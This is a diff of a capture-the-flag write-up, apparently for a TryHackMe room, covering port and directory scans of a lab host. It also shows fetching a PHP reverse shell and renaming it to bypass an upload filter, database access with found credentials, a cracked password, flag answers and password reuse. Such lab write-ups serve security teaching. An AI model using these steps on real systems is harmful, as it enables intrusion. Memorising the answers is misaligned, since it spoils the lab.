@@ -16,7 +16,7 @@ description: Web
 nmap -sC -sV -T5 -p1-65535 10.10.243.219
 ```
 
-![](../.gitbook/assets/image%20%28366%29.png)
+![](../.gitbook/assets/image%20%28367%29.png)
 
 {% hint style="success" %}
 80, 65000
@@ -28,7 +28,7 @@ nmap -sC -sV -T5 -p1-65535 10.10.243.219
 gobuster dir -u http://10.10.243.219 -w /usr/share/dirb/wordlists/common.txt
 ```
 
-![](../.gitbook/assets/image%20%28369%29.png)
+![](../.gitbook/assets/image%20%28371%29.png)
 
 ```text
 gobuster dir -u http://10.10.243.219:65000 -w /usr/share/dirb/wordlists/common.txt -x php -t 50
@@ -68,11 +68,11 @@ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/ph
 mv php-reverse-shell.php image.jpeg.php
 ```
 
-![](../.gitbook/assets/image%20%28364%29.png)
-
-![](../.gitbook/assets/image%20%28367%29.png)
-
 ![](../.gitbook/assets/image%20%28365%29.png)
+
+![](../.gitbook/assets/image%20%28368%29.png)
+
+![](../.gitbook/assets/image%20%28366%29.png)
 
 {% hint style="success" %}
 No answer needed
@@ -82,7 +82,7 @@ No answer needed
 
 
 
-![](../.gitbook/assets/image%20%28363%29.png)
+![](../.gitbook/assets/image%20%28364%29.png)
 
 {% hint style="success" %}
 THM{ENTER\_THE\_GRID}
@@ -118,11 +118,29 @@ tron:IFightForTheUsers
 
 ### Access the database and discover the encrypted credentials. What is the name of the database you find these in?
 
+```text
+mysql -u tron -p
+IFightForTheUsers
+show databases;
+use tron;
 
+```
+
+![](../.gitbook/assets/image%20%28363%29.png)
+
+{% hint style="success" %}
+tron
+{% endhint %}
 
 ### Crack the password. What is it?
 
+{% embed url="https://hashes.com/en/tools/hash\_identifier" %}
 
+![](../.gitbook/assets/image%20%28369%29.png)
+
+{% hint style="success" %}
+@computer@
+{% endhint %}
 
 ### Use su to login to the newly discovered user by exploiting password reuse.
 
